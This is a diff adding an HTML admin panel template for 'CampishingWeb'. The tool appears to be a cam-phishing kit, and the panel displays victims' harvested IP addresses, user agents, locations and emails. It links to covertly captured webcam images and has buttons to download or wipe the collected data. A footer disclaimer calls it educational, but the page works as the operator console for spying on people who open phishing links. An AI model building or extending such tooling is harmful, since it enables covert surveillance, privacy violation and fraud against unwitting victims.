@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Admin Panel</title>
+    <style>
+        body {
+            background: linear-gradient(to right, #f6f9fc, #e9efff);
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            background: #ffffff;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+        }
+        .header img {
+            max-width: 120px;
+            height: 50px;
+        }
+        h1 {
+            background: #4a90e2;
+            color: white;
+            padding: 20px;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 1200px; /* Optional: max width to prevent too wide layouts */
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .section {
+            margin-bottom: 40px;
+        }
+        h2 {
+            color: #333;
+            border-bottom: 2px solid #4a90e2;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        table, th, td {
+            border: 1px solid #ddd;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #4a90e2;
+            color: white;
+        }
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        tr:hover {
+            background-color: #f1f1f1;
+        }
+        button {
+            background-color: #4a90e2;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            margin: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #357abd;
+        }
+        .logout-button {
+            background-color: #d9534f;
+        }
+        .logout-button:hover {
+            background-color: #c9302c;
+        }
+        a {
+            color: #4a90e2;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            background: #ffffff;
+            color: #000000;
+            text-align: center;
+            padding: 20px;
+            position: relative;
+            width: 100%;
+        }
+        .footer a {
+            color: #000000;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="/static/logo.png" alt="Logo">
+        <h2>CampishingWeb</h2>
+    </div>
+    <div class="container">
+        <h1>Admin Panel</h1>
+        <p>Welcome, {{ current_user.username }}!</p>
+
+        <div class="section">
+            <form method="post">
+                <button name="download_data" type="submit">Download Collected Data</button>
+                <button name="clear_data" type="submit">Clear All Data and Images</button>
+                <button name="clear_txt_data" type="submit">Clear All TXT Data </button>
+                
+                <button name="logout" type="submit" class="logout-button">Logout</button>
+            </form>
+        </div>
+
+        <div class="section">
+            <h2>Collected Data</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>IP Address</th>
+                        <th>User Agent</th>
+                        <th>Location</th>
+                        <th>Email</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for id, data in data.items() %}
+                        <tr>
+                            <td>{{ id }}</td>
+                            <td>{{ data.ip_address }}</td>
+                            <td>{{ data.user_agent }}</td>
+                            <td>{{ data.location }}</td>
+                            <td>{{ data.email }}</td>
+                        </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>Webcam Images</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>Webcam Image Path</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for id, data in data.items() %}
+                        <tr>
+                            <td>{{ id }}</td>
+                            <td>
+                                {% if data.webcam_image_path != 'None' %}
+                                    <a href="{{ url_for('download_image', image_name=data.webcam_image_path.split('/')[-1]) }}">Download Image</a>
+                                {% else %}
+                                    No Image
+                                {% endif %}
+                            </td>
+                        </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="footer">
+        <p><a href="/privacy-policy">Privacy Policy</a> | <a href="/terms-of-service">Terms of Service</a></p>
+        <p><small>Disclaimer: The URLs generated are for educational purposes only. We are not responsible for any misuse of this service.</small></p>
+        <p>&copy; 2024 KannadaGamersHub. All rights reserved.</p>
+    </div>
+</body>
+</html>
